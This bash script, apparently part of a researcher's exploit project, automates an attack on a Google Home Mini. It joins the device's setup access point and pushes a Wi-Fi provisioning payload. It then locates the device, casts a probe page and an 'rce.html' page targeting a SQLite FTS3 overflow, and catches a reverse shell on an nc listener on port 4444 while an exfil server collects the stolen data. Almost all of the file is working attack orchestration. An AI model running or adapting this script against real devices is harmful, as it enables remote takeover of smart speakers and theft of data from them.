#!/usr/bin/env bash
# attack.sh — end-to-end Magellan attack on Google Home Mini.
#
# Step 1: Join setup AP with a STATIC IP (avoids DHCP delay).
# Step 2: Fire connect_wifi with pre-computed encrypted payload (no fetching).
# Step 3: Immediately drop setup AP and reconnect Livebox-C5C0.
# Step 4: Monitor ARP for Mini's MAC (44:07:0B:D2:6F:36).
# Step 5: Cast probe.html → confirm SQLite version.
# Step 6: Cast rce.html → Magellan shell.
set -euo pipefail

MISE_PY=/home/tkmremi/.local/share/mise/installs/python/latest/bin/python3
MISE_SP=/home/tkmremi/.local/share/mise/installs/python/3.15.1/lib/python3.15/site-packages
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
MAGELLAN="$ROOT/reconstruction/exploit/magellan"
MY_IP="192.168.1.24"
MINI_MAC="44:07:0b:d2:6f:36"
SETUP_SSID="GoogleHome4983.o,"
SETUP_IP="192.168.255.100/24"
SETUP_GW="192.168.255.249"
PROBE_ONLY="${1:-}"

export PYTHONPATH="$MISE_SP"

# ── helpers ──────────────────────────────────────────────────────────────────
mini_ip() {
  arp -n 2>/dev/null | awk -v mac="$MINI_MAC" 'tolower($3)==mac{print $1}' | head -1
}

# ── 1. Pre-start exfil server and nc ─────────────────────────────────────────
pkill -f "exfil_server.py" 2>/dev/null || true; sleep 0.3
$MISE_PY "$MAGELLAN/exfil_server.py" --ip "$MY_IP" &
EXFIL_PID=$!

pkill -f "nc -lvnp 4444" 2>/dev/null || true; sleep 0.3
nc -lvnp 4444 &
NC_PID=$!

trap 'kill $EXFIL_PID $NC_PID 2>/dev/null; nmcli con up "Livebox-C5C0" 2>/dev/null; nmcli con delete gh-fast 2>/dev/null' EXIT INT TERM
sleep 0.5
echo "[*] Exfil server PID=$EXFIL_PID  nc PID=$NC_PID"

# ── 2. Build setup AP profile with static IP (no DHCP needed) ────────────────
nmcli con delete "gh-fast" 2>/dev/null || true
nmcli con add \
  type wifi \
  con-name "gh-fast" \
  ssid "$SETUP_SSID" \
  autoconnect no \
  802-11-wireless.hidden yes \
  ipv4.method manual \
  ipv4.addresses "$SETUP_IP" \
  ipv4.gateway "$SETUP_GW" \
  ipv6.method ignore 2>/dev/null
echo "[*] Setup AP profile created (static $SETUP_IP)"

# ── 3. JOIN SETUP AP ─────────────────────────────────────────────────────────
echo "[*] Disconnecting from Livebox to allow clean setup AP join..."
T0=$SECONDS
nmcli con down "Livebox-C5C0" 2>/dev/null || true
sleep 1

echo "[*] Joining setup AP (static IP, no DHCP)..."
nmcli con up "gh-fast" 2>&1 | tail -1

# Wait until actually associated with setup AP (BSSID FA:8F:CA:35:5C:46)
for i in $(seq 1 15); do
  BSSID=$(iw dev wlp0s20f3 link 2>/dev/null | grep "Connected to" | awk '{print $3}')
  if [[ "${BSSID,,}" == "fa:8f:ca:35:5c:46" ]]; then
    echo "[*] Associated with setup AP after ${i}s."
    break
  fi
  sleep 1
done
sleep 0.5

echo "[*] Sending connect_wifi (pre-computed payload)..."
$MISE_PY "$ROOT/scripts/fast-provision-send.py" "$SETUP_GW" 2>&1

T1=$SECONDS
echo "[*] connect_wifi sent after $((T1-T0))s. Switching back to Livebox NOW..."

# ── 4. SWITCH BACK ───────────────────────────────────────────────────────────
nmcli con delete "gh-fast" 2>/dev/null || true
nmcli con up "Livebox-C5C0" 2>&1 | tail -1
sleep 1
T2=$SECONDS
echo "[*] Back on Livebox after $((T2-T0))s total."

# ── 5. MONITOR ARP for Mini's MAC ───────────────────────────────────────────
echo ""
echo "[*] Monitoring ARP for Mini ($MINI_MAC) — Mini had IP 90s ago..."
MINI_IP=""
for i in $(seq 1 45); do
  # ARP sweep of likely IP range
  for IP in 192.168.1.{29..70}; do arping -I wlp0s20f3 -c1 -w0.5 "$IP" &>/dev/null & done
  wait 2>/dev/null || true

  MINI_IP=$(mini_ip)
  if [[ -n "$MINI_IP" ]]; then
    echo ""
    echo "[+] MINI FOUND: $MINI_IP (after $((SECONDS-T0))s)"
    break
  fi
  echo -n "[$i]."
  sleep 2
done
echo ""

if [[ -z "$MINI_IP" ]]; then
  echo "[!] Mini not found. Checking if it reverted to setup AP..."
  nmcli dev wifi list 2>/dev/null | grep -i "google\|FA:8F" | head -3
  echo "[!] The Mini likely reverted. Check MAC randomization or try again."
  exit 1
fi

# ── 6. Wait for Cast port 8009 ───────────────────────────────────────────────
echo "[*] Mini at $MINI_IP — waiting for Cast port 8009..."
for i in $(seq 1 45); do
  if nc -z -w2 "$MINI_IP" 8009 2>/dev/null; then
    echo "[+] Cast port OPEN after $((SECONDS-T0))s!"
    break
  fi
  # Also try 8008 (older Cast)
  if nc -z -w2 "$MINI_IP" 8008 2>/dev/null; then
    echo "[+] Port 8008 OPEN after $((SECONDS-T0))s!"
    break
  fi
  echo -n "."
  sleep 2
done
echo ""

# ── 7. PROBE ─────────────────────────────────────────────────────────────────
echo "[*] Casting probe.html → checking SQLite version..."
$MISE_PY "$MAGELLAN/cast_launch.py" "$MINI_IP" "http://${MY_IP}:8080/probe.html" &

echo "[*] Waiting 35s for probe exfil..."
sleep 35

echo ""
echo "[*] Exfil received (check output above):"
ls -lt "$ROOT/evidence"/magellan-exfil-*.json 2>/dev/null | head -3 | awk '{print $NF}' | while read f; do
  echo "  $f:"; python3 -m json.tool "$f" 2>/dev/null | grep -E '"msg"' | tail -5
done

[[ "$PROBE_ONLY" == "--probe-only" ]] && { echo "[*] probe-only done."; exit 0; }

# ── 8. RCE ───────────────────────────────────────────────────────────────────
echo ""
read -r -p "Launch rce.html (Magellan FTS3 overflow)? [y/N] " yn
[[ "$yn" != "y" && "$yn" != "Y" ]] && exit 0

echo "[*] Casting rce.html..."
$MISE_PY "$MAGELLAN/cast_launch.py" "$MINI_IP" "http://${MY_IP}:8080/rce.html"
echo "[*] Waiting 60s for reverse shell on nc listener above..."
sleep 60
